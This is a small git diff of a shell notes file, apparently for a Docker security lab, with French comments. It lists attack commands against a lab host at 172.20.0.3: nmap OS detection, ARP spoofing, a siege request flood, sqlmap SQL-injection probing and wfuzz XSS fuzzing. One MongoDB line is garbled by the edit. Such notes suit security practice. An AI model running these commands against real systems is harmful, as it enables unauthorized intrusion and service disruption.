@@ -16,5 +16,11 @@ nmap -O 172.20.0.3
 #ARP SPOOFING
 arpspoof -i eth0 -t 172.20.0.3 172.20.0.1
 
-#mogodb 
-docker exec -it database-mongo mongosh --eval "rs.initiate({_id: 'rs0', members: [{_id: 0, host: 'database-mongo:27017'}]})"
+#mogodb docker exec -it database-mongo mongosh --eval "rs.initiate({_id: 'rs0', members: [{_id: 0, host: 'database-mongo:27017'}]})"
+docker exec -it database-mongo 
+## Envoie une rafale de requêtes HTTP sur la victime en simulant 50 utilisateurs simultanés
+siege -c 50 -t 10s http://172.20.0.3/
+~## sqlmap va fuzzer le paramètre 'q' pour chercher une faille SQL
+sqlmap -u "http://172.20.0.3/api/search.php?q=test" --batch --banner
+# Détecter si les scripts injectés passent
+wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/XSS.txt http://172.20.0.3/api/search.php?q=FUZZ
